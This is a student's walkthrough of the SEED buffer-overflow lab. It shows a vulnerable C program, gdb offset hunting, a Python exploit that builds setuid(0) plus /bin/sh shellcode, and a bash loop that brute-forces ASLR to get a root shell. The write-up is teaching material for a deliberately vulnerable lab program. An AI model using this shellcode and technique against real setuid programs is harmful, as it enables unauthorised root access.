@@ -1,0 +1,237 @@
+This lab is designed by professor Wenliang Du from Syracuse University.
+https://seedsecuritylabs.org/Labs_16.04/Software/Buffer_Overflow/
+
+Step 1: Turn off ASLR, if we use 32-bit system, we can do brute-force, to make it easier, we turn off it first.
+// Turn off address randomization
+```
+sudo sysctl -w kernel.randomize_va_space=0 
+```
+
+the stack.c have buffer-overflow vulnerability:
+/* Vunlerable program: stack.c */
+/* You can get this program from the lab's website */
+
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+
+/* Changing this size will change the layout of the stack.
+* Instructors can change this value each year, so students
+* won't be able to use the solutions from the past.
+* Suggested value: between 0 and 400  */
+#ifndef BUF_SIZE
+#define BUF_SIZE 24
+#endif
+
+
+int bof(char *str)
+{
+    char buffer[BUF_SIZE];
+
+
+    /* The following statement has a buffer overflow problem */
+    strcpy(buffer, str);       
+
+
+    return 1;
+}
+
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+
+     /* Change the size of the dummy array to randomize the parameters
+       for this lab. Need to use the array at least once */
+    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE);
+
+
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+    printf("Returned Properly\n");
+    return 1;
+}
+
+
+Step 2: compile the file to make code on stack executable
+Because the stack can not be executed by default, so we compile the program to make the stack executable:
+// Compile the program
+gcc stack.c -o stack -z execstack -fno-stack-protector 
+
+Step 3: find the offset of the ebp and the return address
+
+
+
+We are trying to find the address of the buffer's start point. But it shows that it is too far from the buffer to ebp.
+
+So we try to debug the program through changing compiling:
+
+// Compile stack.c for debugging
+$ gcc stack.c -o stack_gdb -g -z execstack -fno-stack-protector
+
+// Run gdb
+$ gdb -q stack_gdb 
+
+$ b bof // set the breakpoint at boo
+$ run // the program
+$ p &buffer //print the address of buffer
+$ p $ebp // print the ebb’s address
+
+
+
+Then we find out the offset between the buffer and the ebp is 32, and the address of ebp is 0xbfffea78
+
+Step 4: construct the payload:
+the program is as below:
+exploit.py
+#!/usr/bin/python3
+import sys
+
+
+shellcode= (
+   "\x31\xc0"    # xorl    %eax,%eax
+   "\x50"        # pushl   %eax
+   "\x68""//sh"  # pushl   $0x68732f2f
+   "\x68""/bin"  # pushl   $0x6e69622f
+   "\x89\xe3"    # movl    %esp,%ebx
+   "\x50"        # pushl   %eax
+   "\x53"        # pushl   %ebx
+   "\x89\xe1"    # movl    %esp,%ecx
+   "\x99"        # cdq
+   "\xb0\x0b"    # movb    $0x0b,%al
+   "\xcd\x80"    # int     $0x80
+).encode('latin-1')
+
+
+
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+
+# Put the shellcode at the end
+start = 517 - len(shellcode)
+content[start:] = shellcode
+
+
+##################################################################
+ret    = 0xbfffea78 + 208   # replace 0xAABBCCDD with the correct value
+offset = 32            # replace 0 with the correct value
+
+
+content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
+##################################################################
+
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content) 
+
+Because above ebp is 'old ebp' and then 'return address', so we should set the value of the 'ret'(return address) as '$ebp+8' at least, because compiler will add some information in it, so we should add more than 8, so we choose 208(as long as the total length is less than 517). Don't use '0x00', it might be cut off when the OS sees the '0x00'.
+
+
+Then we set the offset as '32' which is the offset between the ebp and the buffer.
+
+Step 5: run the exploit.py to construct the payload and run the 'stack' program again.
+
+
+It shows 'segmentation fault' which is wired.
+, so we try to find the error reason with 'dmesg' command to prints the message buffer of the kernel.
+
+$ dmesg
+ 
+
+
+It shows that the program stopped at the '909090', so I guess the place of return address is wrong. (the memory address may slightly different in GDB)
+
+Then we try to look for the offset of the return address.
+First, we construct the 'badfile' manually, 
+the payload start with 32 As and 'BBBBCCCCDDDD' because I guess the offset is little bigger than 32. 
+python -c 'print "A"*32+"BBBBCCCCDDDD"’>badfile 
+
+Second, run the stack again and check the error. Don't run exploit.py again, it will cover the 'badfile'
+
+$ ./stack
+$ dmesg
+ 
+
+ As we know, '43' is 'C', so we can count the offset as 32+4=36.
+Then we change the offset as 36 in the 'exploit.py' and run it to generate the payload.
+
+offset = 36 
+
+Run the 'stack' program again.
+It shows that get the '$' which means we are successful!
+
+
+
+Step 6: get the root privilege:
+set the owner as root and set it as set-uid program:
+
+
+Approach 1: because the dash will drop the privilege, so we can use 'zsh' instead to run the file.
+Approach 2:
+Because the action of the drop privilege is comparing the uid and the eid, if they are not match, the eid will set as uid. So we can do setuid(0) manualy. Here is the assembly code of the setuid(0). 0 is for root.
+
+   "\x31\xc0"   
+   "\x31\xdb"  
+   "\xb0\xd5"
+   "\xcd\x80" 
+
+The shellcode in the exploit.py will be like this:
+shellcode= (
+   "\x31\xc0"   
+   "\x31\xdb"  
+   "\xb0\xd5"
+   "\xcd\x80"
+   "\x31\xc0"    # xorl    %eax,%eax
+   "\x50"        # pushl   %eax
+   "\x68""//sh"  # pushl   $0x68732f2f
+   "\x68""/bin"  # pushl   $0x6e69622f
+   "\x89\xe3"    # movl    %esp,%ebx
+   "\x50"        # pushl   %eax
+   "\x53"        # pushl   %ebx
+   "\x89\xe1"    # movl    %esp,%ecx
+   "\x99"        # cdq
+   "\xb0\x0b"    # movb    $0x0b,%al
+   "\xcd\x80"    # int     $0x80
+).encode('latin-1') 
+
+Then we run the code again. We get the '#' which means we get the root successfully!
+We can also check the uid of it, it is 0(root).
+
+
+
+Step 7: do brute force to bypass the ASLR
+For 32-bit system, it only leverages 19 bits so it not very hard to do the brute-force.
+Turn on the ASLR
+
+sudo sysctl -w kernel.randomize_va_space=2 
+
+Then run the brute-force program. It may take a little time:
+
+#!/bin/bash
+
+SECONDS=0
+value=0
+while [ 1 ]
+  do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  min=$(($duration / 60))
+  sec=$(($duration % 60))
+  echo "$min minutes and $sec seconds elapsed."
+  echo "The program has been running $value times so far."
+  ./stack
+  echo ""
+done
+
+
+
+
+It took me 2 minutes and 22 seconds to get the '#' !
